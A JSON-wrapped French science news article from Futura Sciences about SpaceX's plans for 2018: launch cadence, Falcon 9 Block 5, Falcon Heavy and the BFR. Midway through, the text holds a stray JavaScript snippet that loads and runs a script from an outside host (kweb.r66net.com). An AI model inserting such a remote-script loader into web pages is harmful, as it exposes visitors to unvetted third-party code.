{"title": "SpaceX veut accélérer le rythme de ses lancements en 2018", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "27/11/2017", "content": "2018 sera-t-elle l'année de la maturité pour SpaceX ? La firme d'Elon Musk prévoit d'augmenter sa cadence de lancement. Gwynne Shotwell, présidente et directrice des opérations de SpaceX, interviewée par  SpaceNews , fait le point sur l'état d'avancement des lanceurs en développement et l'amélioration du Falcon 9. Ce qu'il faut retenir Une trentaine de lancements sont prévus en 2018.  La réutilisabilité est au cœur de la stratégie de SpaceX.  Les moteurs des nouveaux lanceurs seront plus performants. Dans une  interview accordée  au site d'informations spatiales  SpaceNews , Gwynne Shotwell, présidente et directrice des opérations de  SpaceX , annonce pour 2018 une «  augmentation de la cadence de lancement avec une dizaine de tirs de plus qu'en 2017  » ; elle vise, à terme, entre 30 et 40 lancements annuels. Cette année, la firme d'Elon Musk a déjà réalisé 16 lancements ; 3, voire 4, missions sont à réaliser d'ici la fin 2017. Les missions prévues en 2018 n'incluent pas celles dédiées au déploiement des quelque 4.425 satellites de la constellation SpaceX. Bien que l'entreprise se soit exprimée sur ce sujet devant une commission du Congrès des États-Unis, Gwynne Shotwell est restée évasive sur la date des premiers lancements, «  qui pourraient débuter ces prochains mois  ». En 2018, la version Block 4 du  Falcon 9  laissera la place à la Block 5, plus puissante, avec un moteur Merlin qui «  délivrera une poussée de 190.000 livres, contre 176.000 pour l'actuel Merlin 1D  ». Les évolutions de cette version sont largement inspirées des demandes de la Nasa, dans le cadre des missions commerciales d'équipage, et de celles de l'armée de l' Air  des États-Unis, pour ses missions militaires. En 2018, une version améliorée du Falcon 9 sera mise en service, avec un objectif de réduction du temps de la remise en état de vol de l'étage récupéré. © SpaceX                               Le Falcon 9 et le Falcon Heavy Cette cinquième version du Falcon 9, dont le  premier vol  date de juin 2010, est conçue avec un objectif de «  réutilisation de dix fois de l'étage principal, voire plus, et la réduction du cycle de la  réutilisation de l’étage principal  entre deux vols  ». Les améliorations apportées ont aussi pour but de simplifier la fabricabilité du lanceur.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le Falcon Heavy, dont l' étage principal  est formé de trois étages principaux du Falcon 9, utilisera également la version Block 5, sauf lors de son vol inaugural (le lanceur est en cours de construction). Ce premier tir, dont la date n'a toujours pas été officiellement annoncée, est attendu d'ici la fin de l'année 2017, mais «  pourrait finalement avoir lieu seulement en janvier  ».  Le Big Falcon Rocket, un lanceur à tout faire À l'horizon 2022, SpaceX prévoit de remplacer le Falcon 9 et le Falcon Heavy par le  Big Falcon Rocket  (BFR), un lanceur entièrement réutilisable et dédié au lancement de satellites, aux vols habités et aux missions d'exploration. Celui-ci a été présenté en octobre 2017, lors du Congrès international d' astronautique  (IAC) qui s'est tenu en Australie. Néanmoins, «  le Falcon 9 et le Falcon Heavy resteront en service tant qu'il y aura une demande pour les utiliser  ».  Ce futur lanceur sera équipé du moteur Raptor, qui fonctionne avec un mélange de méthane et d' oxygène . L'étage principal du BFR comptera 31 de ces moteurs (6 pour l'étage supérieur), contre 27 moteurs Merlin pour le Falcon Heavy et 9 pour le Falcon 9. Il fut un temps envisagé d'adapter les moteurs Raptor au lanceur Falcon 9, mais ce ne sera finalement pas le cas. Enfin, SpaceX travaille aussi sur des tests de récupération de la coiffe du Falcon 9 et sur une tentative de récupération d'un étage supérieur pour le réutiliser. Il s'agit moins d'une question de réduction de coûts que d'en savoir plus sur la réutilisabilité complète d'un lanceur pour préparer au mieux les différentes versions du BFR qui seront nativement réutilisables. ", "theme": "sciences"}